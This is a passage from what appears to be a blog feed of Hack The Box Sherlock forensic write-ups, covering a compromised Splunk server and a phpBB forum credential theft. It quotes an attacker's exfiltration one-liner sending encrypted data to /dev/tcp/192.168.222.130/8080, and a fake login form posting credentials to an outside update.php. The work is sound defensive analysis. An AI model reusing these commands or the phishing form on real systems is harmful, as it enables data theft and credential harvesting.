</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:02:21 ubuntu sudo:    nginx : <span style="color:#8be9fd;font-style:italic">TTY</span><span style="color:#ff79c6">=</span>pts/2 ; <span style="color:#8be9fd;font-style:italic">PWD</span><span style="color:#ff79c6">=</span>/var/www ; <span style="color:#8be9fd;font-style:italic">USER</span><span style="color:#ff79c6">=</span>root ; <span style="color:#8be9fd;font-style:italic">COMMAND</span><span style="color:#ff79c6">=</span>/usr/bin/mv /home/johnnycage/Documents/Important.pdf .
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:02:21 ubuntu sudo: pam_unix<span style="color:#ff79c6">(</span>sudo:session<span style="color:#ff79c6">)</span>: session opened <span style="color:#ff79c6">for</span> user root by nginx<span style="color:#ff79c6">(</span><span style="color:#8be9fd;font-style:italic">uid</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:02:54 ubuntu sudo:    nginx : <span style="color:#8be9fd;font-style:italic">TTY</span><span style="color:#ff79c6">=</span>pts/2 ; <span style="color:#8be9fd;font-style:italic">PWD</span><span style="color:#ff79c6">=</span>/var/www ; <span style="color:#8be9fd;font-style:italic">USER</span><span style="color:#ff79c6">=</span>root ; <span style="color:#8be9fd;font-style:italic">COMMAND</span><span style="color:#ff79c6">=</span>/usr/bin/openssl enc -aes-256-cbc -iv 4fa17640b7dfe8799f072c65b15f581d -K 3cabc6db78a034f69f16aa8986cf2e2cea05713b1e95ff9b2d80f6a71ae76b7d -in data.zip
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:02:54 ubuntu sudo: pam_unix<span style="color:#ff79c6">(</span>sudo:session<span style="color:#ff79c6">)</span>: session opened <span style="color:#ff79c6">for</span> user root by nginx<span style="color:#ff79c6">(</span><span style="color:#8be9fd;font-style:italic">uid</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:03:01 ubuntu sudo:    nginx : <span style="color:#8be9fd;font-style:italic">TTY</span><span style="color:#ff79c6">=</span>pts/2 ; <span style="color:#8be9fd;font-style:italic">PWD</span><span style="color:#ff79c6">=</span>/var/www ; <span style="color:#8be9fd;font-style:italic">USER</span><span style="color:#ff79c6">=</span>root ; <span style="color:#8be9fd;font-style:italic">COMMAND</span><span style="color:#ff79c6">=</span>/usr/bin/rm -rf data.zip Important.pdf
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:03:01 ubuntu sudo: pam_unix<span style="color:#ff79c6">(</span>sudo:session<span style="color:#ff79c6">)</span>: session opened <span style="color:#ff79c6">for</span> user root by nginx<span style="color:#ff79c6">(</span><span style="color:#8be9fd;font-style:italic">uid</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:03:08 ubuntu sshd<span style="color:#ff79c6">[</span>13702<span style="color:#ff79c6">]</span>: Disconnected from user nginx 192.168.222.130 port <span style="color:#bd93f9">43302</span>
</span></span><span style="display:flex;"><span>Apr <span style="color:#bd93f9">14</span> 08:03:08 ubuntu sshd<span style="color:#ff79c6">[</span>13461<span style="color:#ff79c6">]</span>: pam_unix<span style="color:#ff79c6">(</span>sshd:session<span style="color:#ff79c6">)</span>: session closed <span style="color:#ff79c6">for</span> user nginx
</span></span></code></pre></div><p>The <code>useradd</code> command was issued on  <code>Apr 14 08:00:13</code> and the session for nginx user was closed on <code>Apr 14 08:03:08</code>. I used the [[Time]] resource&rsquo;s Add Subtract Time website to calculate the time difference. It was 2 minutes and 55 seconds.</p>
<p>Then to find the password of the <code>nginx</code> I copied the following snippet from the malicious XSLT file.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ <span style="color:#8be9fd;font-style:italic">access</span><span style="color:#ff79c6">=</span><span style="color:#ff79c6">$(</span><span style="color:#8be9fd;font-style:italic">echo</span> MzlhNmJiZTY0NTYzLTY3MDktOTNhNC1hOWYzLTJjZTc4Mjhm | base64 -d | rev<span style="color:#ff79c6">)</span>;<span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#f1fa8c">&#34;nginx:</span><span style="color:#8be9fd;font-style:italic">$access</span><span style="color:#f1fa8c">&#34;</span>;     
</span></span><span style="display:flex;"><span>nginx:f8287ec2-3f9a-4a39-9076-36546ebb6a93
</span></span></code></pre></div><p>The password for the <code>nginx</code> user is stored inside the <code>$access</code> variable.</p>
<p>Task 7 was really hard for me. I first read the attacker <code>.bash_history</code> file and fond the following commands the TA ran.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>whoami
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">cd</span> /opt/splunk/bin/scripts/
</span></span><span style="display:flex;"><span>ls
</span></span><span style="display:flex;"><span>sudo rm -rf search.sh 
</span></span><span style="display:flex;"><span>ls
</span></span><span style="display:flex;"><span>sudo su
</span></span><span style="display:flex;"><span>ls
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">cd</span> /home/johnnycage/
</span></span><span style="display:flex;"><span>tree
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">cd</span> ~
</span></span><span style="display:flex;"><span>ls
</span></span><span style="display:flex;"><span>sudo mv /home/johnnycage/Documents/Important.pdf .
</span></span><span style="display:flex;"><span>ls
</span></span><span style="display:flex;"><span>zip data.zip *
</span></span><span style="display:flex;"><span>ls
</span></span><span style="display:flex;"><span>sudo openssl enc -aes-256-cbc -iv <span style="color:#ff79c6">$(</span>cut -c 1-32 <span style="color:#ff79c6">&lt;&lt;&lt;</span> <span style="color:#ff79c6">$(</span>uname -r | md5sum<span style="color:#ff79c6">))</span> -K <span style="color:#ff79c6">$(</span>cut -c 1-64 <span style="color:#ff79c6">&lt;&lt;&lt;</span> <span style="color:#ff79c6">$(</span>date +%s | sha256sum<span style="color:#ff79c6">))</span> -in data.zip | base64 | dd <span style="color:#8be9fd;font-style:italic">conv</span><span style="color:#ff79c6">=</span>ebcdic &gt; /dev/tcp/192.168.222.130/8080
</span></span><span style="display:flex;"><span>sudo rm -rf *
</span></span><span style="display:flex;"><span>ls
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">exit</span>
</span></span></code></pre></div><p>At a first glance it&rsquo;s a clever trick to hide the used key and iv for the AES-256-CBC algorithm used to encrypt the exfiltrated file. There&rsquo;s a lot of randomness to both the key and iv.</p>
<p>But examining the <code>auth.log</code> we found the plain command that was ran by the <code>nginx</code> user.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>$ cat auth.log | grep -i .zip               
</span></span><span style="display:flex;"><span>Apr 14 08:02:54 ubuntu sudo:    nginx : TTY=pts/2 ; PWD=/var/www ; USER=root ; COMMAND=/usr/bin/openssl enc -aes-256-cbc -iv 4fa17640b7dfe8799f072c65b15f581d -K 3cabc6db78a034f69f16aa8986cf2e2cea05713b1e95ff9b2d80f6a71ae76b7d -in data.zip
</span></span><span style="display:flex;"><span>Apr 14 08:03:01 ubuntu sudo:    nginx : TTY=pts/2 ; PWD=/var/www ; USER=root ; COMMAND=/usr/bin/rm -rf data.zip Important.pdf
</span></span></code></pre></div><p>We found the Key and the IV for the data.zip file. But, unfortunately the TA deleted the files both <code>data.zip</code> and <code>Important.pdf</code>. I scoured the whole OS directories and files to find the file but to my ignorance I completely ignored the <code>capture.pcapng</code> file.</p>
<p>So, I opened up Wireshark again and searched for the port <code>8080</code>.
<img src="images/20240615181116.png" alt="alt text"></p>
<p>I followed the TCP stream and exported the data in <code>ASCII</code> format.
<img src="images/20240615181240.png" alt="alt text"></p>
<p>But, I couldn&rsquo;t decrypt the <code>data.zip</code>. Something was not right as I completely ignored another hint from the commands ran by the TA. Before, exfiltrating the data the did some encoding to the data.zip file.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo openssl enc -aes-256-cbc -iv <span style="color:#ff79c6">$(</span>cut -c 1-32 <span style="color:#ff79c6">&lt;&lt;&lt;</span> <span style="color:#ff79c6">$(</span>uname -r | md5sum<span style="color:#ff79c6">))</span> -K <span style="color:#ff79c6">$(</span>cut -c 1-64 <span style="color:#ff79c6">&lt;&lt;&lt;</span> <span style="color:#ff79c6">$(</span>date +%s | sha256sum<span style="color:#ff79c6">))</span> -in data.zip | base64 | dd <span style="color:#8be9fd;font-style:italic">conv</span><span style="color:#ff79c6">=</span>ebcdic &gt; /dev/tcp/192.168.222.130/8080
</span></span></code></pre></div><p>They first converted the encrypted data.zip file to <code>base64</code> and then used <code>dd conv=ebcdic</code> to convert the codec from <code>ASCII</code> to <code>EBCDIC</code>.</p>
<p>This time I exported the whole TCP stream in <code>EBCDIC</code> which reversed the <code>EBCDIC</code> conversion back to <code>ASCII</code>.
<img src="images/20240615181906.png" alt="alt text">
We can see the content is now in <code>base64</code> when I selected show data as <code>EBCDIC</code>.</p>
<p>Then, decoded the <code>base64</code> back to encrypted <code>data.zip</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ base64 -di data &gt; data.zip
</span></span></code></pre></div><p>Now we got the encrypted data.zip file. We can now successfully try to decrypt it.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ openssl enc -d -aes-256-cbc -iv 4fa17640b7dfe8799f072c65b15f581d -K 3cabc6db78a034f69f16aa8986cf2e2cea05713b1e95ff9b2d80f6a71ae76b7d -in data.zip -out data_dec.zip
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$ unzip data_dec.zip
</span></span><span style="display:flex;"><span>Archive:  data_dec.zip
</span></span><span style="display:flex;"><span>  inflating: Important.pdf
</span></span></code></pre></div><p>Found, the <code>Important.pdf</code>. And found the answer to Task 7.
<img src="images/20240615182506.png" alt="alt text"></p>
<p>For the Task 8, we can easily find the credential using Wireshark.
<img src="images/20240615182843.png" alt="alt text"></p>
<h3 id="summary">Summary</h3>
<p>In this Sherlock, the TA exploited the Splunk Server to run a malicious bash script embedded in XSLT file. The bash script contained a persistence mechanism to add a new user onto the system and to the sudo group. The TA also injected a public key to the newly created user <code>nginx</code>&rsquo;s <code>.ssh/authorized_keys</code> to access the backdoor account. After that the TA logged in as <code>nginx</code> and elevated their privileges to <code>root</code> using <code>su</code>. Then the TA moved an important file from <code>johnycage</code>&rsquo;s <code>Documents</code> directory and encrypted the file and exfiltrated the file to his own C2 server <code>192.168.222.130:8080</code>.</p>
]]></description></item><item><title>HTB Sherlock Bumblebee</title><link>https://hshakilst.github.io/posts/htb-sherlocks/bumblebee/</link><pubDate>Sat, 15 Jun 2024 03:54:17 -0400</pubDate><guid>https://hshakilst.github.io/posts/htb-sherlocks/bumblebee/</guid><description><![CDATA[<h1 id="bumblebee-dfir">Bumblebee (DFIR)</h1>
<h3 id="scenario">Scenario</h3>
<p>An external contractor has accessed the internal forum here at Forela via the Guest Wi-Fi, and they appear to have stolen credentials for the administrative user! We have attached some logs from the forum and a full database dump in sqlite3 format to help you in your investigation.</p>
<h3 id="artifacts">Artifacts</h3>
<table>
<thead>
<tr>
<th>Artifact</th>
<th>MD5 Hash</th>
<th>Password</th>
</tr>
</thead>
<tbody>
<tr>
<td>bumblebee.zip</td>
<td>ba06e26779ead4b6299b6a188d11fc02</td>
<td>hackthebkue</td>
</tr>
<tr>
<td>incident.tgz</td>
<td>1b301c2fb2a1232758aca31588506edf</td>
<td>n/a</td>
</tr>
</tbody>
</table>
<h3 id="tools-used">Tools Used</h3>
<ul>
<li>SQLite Browser - For <code>phpbb.sqlite3</code> database analysis.</li>
<li>Linux Terminal - For <code>access.log</code> analysis.</li>
</ul>
<h3 id="forensic-analysis">Forensic Analysis</h3>
<p><strong>Analyzing SQLite3 Database</strong></p>
<p>The contractor&rsquo;s user information are listed below.
<img src="images/20240613104708.png" alt="User Info"></p>
<p>The contractor&rsquo;s post information for the forum are listed below.
<img src="images/20240613105158.png" alt="Post Info"></p>
<p>Post contents malicious part</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">--snip--</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">div</span> <span style="color:#50fa7b">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;page-body&#34;</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;page-body&#34;</span> <span style="color:#50fa7b">role</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;main&#34;</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">div</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;panel&#34;</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">div</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;inner&#34;</span>&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">div</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;content&#34;</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">h3</span>&gt;Session Timeout&lt;/<span style="color:#ff79c6">h3</span>&gt; &lt;<span style="color:#ff79c6">br</span> /&gt; &lt;<span style="color:#ff79c6">br</span> /&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">p</span>&gt;Your session token has timed out in order to proceed you must login again.&lt;/<span style="color:#ff79c6">p</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#ff79c6">div</span>&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#ff79c6">div</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#ff79c6">div</span>&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">form</span> <span style="color:#50fa7b">action</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;http://10.10.0.78/update.php&#34;</span> <span style="color:#50fa7b">method</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;post&#34;</span> <span style="color:#50fa7b">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;login&#34;</span> <span style="color:#50fa7b">data-focus</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;username&#34;</span> <span style="color:#50fa7b">target</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;hiddenframe&#34;</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">div</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;panel&#34;</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">div</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;inner&#34;</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">div</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;content&#34;</span>&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">h2</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;login-title&#34;</span>&gt;Login&lt;/<span style="color:#ff79c6">h2</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">fieldset</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;fields1&#34;</span>&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">dl</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">dt</span>&gt;&lt;<span style="color:#ff79c6">label</span> <span style="color:#50fa7b">for</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;username&#34;</span>&gt;Username:&lt;/<span style="color:#ff79c6">label</span>&gt;&lt;/<span style="color:#ff79c6">dt</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">dd</span>&gt;&lt;<span style="color:#ff79c6">input</span> <span style="color:#50fa7b">type</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;text&#34;</span> <span style="color:#50fa7b">tabindex</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;1&#34;</span> <span style="color:#50fa7b">name</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;username&#34;</span> <span style="color:#50fa7b">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;username&#34;</span> <span style="color:#50fa7b">size</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;25&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#50fa7b">value</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;&#34;</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;inputbox autowidth&#34;</span>&gt;&lt;/<span style="color:#ff79c6">dd</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#ff79c6">dl</span>&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">dl</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">dt</span>&gt;&lt;<span style="color:#ff79c6">label</span> <span style="color:#50fa7b">for</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;password&#34;</span>&gt;Password:&lt;/<span style="color:#ff79c6">label</span>&gt;&lt;/<span style="color:#ff79c6">dt</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">dd</span>&gt;&lt;<span style="color:#ff79c6">input</span> <span style="color:#50fa7b">type</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;password&#34;</span> <span style="color:#50fa7b">tabindex</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;2&#34;</span> <span style="color:#50fa7b">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;password&#34;</span> <span style="color:#50fa7b">name</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;password&#34;</span> <span style="color:#50fa7b">size</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;25&#34;</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;inputbox autowidth&#34;</span> <span style="color:#50fa7b">autocomplete</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;off&#34;</span>&gt;&lt;/<span style="color:#ff79c6">dd</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#ff79c6">dl</span>&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">dl</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">dd</span>&gt;&lt;<span style="color:#ff79c6">label</span> <span style="color:#50fa7b">for</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;autologin&#34;</span>&gt;&lt;<span style="color:#ff79c6">input</span> <span style="color:#50fa7b">type</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;checkbox&#34;</span> <span style="color:#50fa7b">name</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;autologin&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#50fa7b">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;autologin&#34;</span> <span style="color:#50fa7b">tabindex</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;4&#34;</span>&gt;Remember me&lt;/<span style="color:#ff79c6">label</span>&gt;&lt;/<span style="color:#ff79c6">dd</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">dd</span>&gt;&lt;<span style="color:#ff79c6">label</span> <span style="color:#50fa7b">for</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;viewonline&#34;</span>&gt;&lt;<span style="color:#ff79c6">input</span> <span style="color:#50fa7b">type</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;checkbox&#34;</span> <span style="color:#50fa7b">name</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;viewonline&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#50fa7b">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;viewonline&#34;</span> <span style="color:#50fa7b">tabindex</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;5&#34;</span>&gt;Hide my online status this session&lt;/<span style="color:#ff79c6">label</span>&gt;&lt;/<span style="color:#ff79c6">dd</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#ff79c6">dl</span>&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">dl</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">dt</span>&gt;&amp;nbsp;&lt;/<span style="color:#ff79c6">dt</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">dd</span>&gt; &lt;<span style="color:#ff79c6">input</span> <span style="color:#50fa7b">type</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;submit&#34;</span> <span style="color:#50fa7b">name</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;login&#34;</span> <span style="color:#50fa7b">tabindex</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;6&#34;</span> <span style="color:#50fa7b">value</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;Login&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;button1&#34;</span> <span style="color:#50fa7b">onclick</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;sethidden()&#34;</span>&gt;&lt;/<span style="color:#ff79c6">dd</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#ff79c6">dl</span>&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;/fieldset class=&#34;fields1&#34;&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#ff79c6">div</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#ff79c6">div</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#ff79c6">div</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#ff79c6">form</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#ff79c6">div</span>&gt;
</span></span></code></pre></div><p>At this point we have identified the malicious IP <code>10.10.0.78</code>, and was used to access the forum as well as staging a credential stealer namely <code>update.php</code>.</p>
<p>Browsing the <code>phpbb_log</code> table we found additional information when the contractor logged in as Administrator. The real Administrator&rsquo;s IP was <code>10.255.254.2</code>. Upon Investigating the <code>access.log</code> artifact we can verify their information like User-Agent, which URLs were visited to get a sense of baseline activity which are normal for an Administrator user.</p>
<p>Then we can use those information against the threat actor to accurately paint a picture of the malicious activities that was done.</p>
<p><strong>Analyzing <code>access.log</code></strong></p>
<p>An access.log file can have a vast volume of data it is recommended to use Splunk or ElasticSearch or any kind of SIEM tool to quickly find and triage information. But, in our case we have relatively small amount of data and we can use basic Linux commands to filter and search for the information we are looking for.</p>
<p>Filtering the access.log file is very helpful to find the actual data we are looking for. For example, we don&rsquo;t need the data when a page loads and request are made to load CSS, images, assets to render the UI.</p>
<p>We can easily filter those types of requests using <code>egrep</code>. The command for filtering assets related data is given below:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat access.log | egrep -v <span style="color:#f1fa8c">&#34;/(assets|style|images)&#34;</span>
</span></span></code></pre></div><p>Here <code>-v</code> returns everything except the matching pattern.</p>
<p>Let&rsquo;s search for the legit Administrator&rsquo;s User Agent information.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cat access.log | egrep -v <span style="color:#f1fa8c">&#34;/(assets|style|images)&#34;</span> | egrep -i 10.255.254.2 | head -n1
</span></span><span style="display:flex;"><span>10.255.254.2 - - <span style="color:#ff79c6">[</span>25/Apr/2023:12:08:42 +0100<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#34;GET /adm/index.php?sid=ac1490e6c806ac0403c6c116c1d15fa6&amp;i=12 HTTP/1.1&#34;</span> <span style="color:#bd93f9">403</span> <span style="color:#bd93f9">9412</span> <span style="color:#f1fa8c">&#34;http://10.10.0.27/adm/index.php?sid=ac1490e6c806ac0403c6c116c1d15fa6&amp;i=1&#34;</span> <span style="color:#f1fa8c">&#34;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36&#34;</span>
</span></span></code></pre></div><p>Let&rsquo;s search for the adversary&rsquo;s User Agent information.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cat access.log | egrep -v <span style="color:#f1fa8c">&#34;/(assets|style|images)&#34;</span> | egrep -i 10.10.0.78 | head -n1 
</span></span><span style="display:flex;"><span>10.10.0.78 - - <span style="color:#ff79c6">[</span>25/Apr/2023:12:07:39 +0100<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#34;GET / HTTP/1.1&#34;</span> <span style="color:#bd93f9">200</span> <span style="color:#bd93f9">4205</span> <span style="color:#f1fa8c">&#34;-&#34;</span> <span style="color:#f1fa8c">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0&#34;</span>
</span></span></code></pre></div><p>The contractor added himself to the administrator group.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cat access.log | egrep -v <span style="color:#f1fa8c">&#34;/(assets|style|images)&#34;</span> | egrep -i 10.10.0.78 | grep adm | grep acp_groups | grep POST
</span></span><span style="display:flex;"><span>10.10.0.78 - - <span style="color:#ff79c6">[</span>26/Apr/2023:11:53:51 +0100<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#34;POST /adm/index.php?i=acp_groups&amp;sid=eca30c1b75dc3eed1720423aa1ff9577&amp;icat=12&amp;mode=manage&amp;g=5 HTTP/1.1&#34;</span> <span style="color:#bd93f9">200</span> <span style="color:#bd93f9">2623</span> <span style="color:#f1fa8c">&#34;http://10.10.0.27/adm/index.php?i=acp_groups&amp;sid=eca30c1b75dc3eed1720423aa1ff9577&amp;icat=12&amp;mode=manage&amp;action=list&amp;g=5&#34;</span> <span style="color:#f1fa8c">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&#34;</span>
</span></span></code></pre></div><p>The contractor also sent two requests to backup the database.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cat access.log | egrep -v <span style="color:#f1fa8c">&#34;/(assets|style|images)&#34;</span> | egrep -i 10.10.0.78 | grep adm | grep <span style="color:#8be9fd;font-style:italic">action</span><span style="color:#ff79c6">=</span>download            
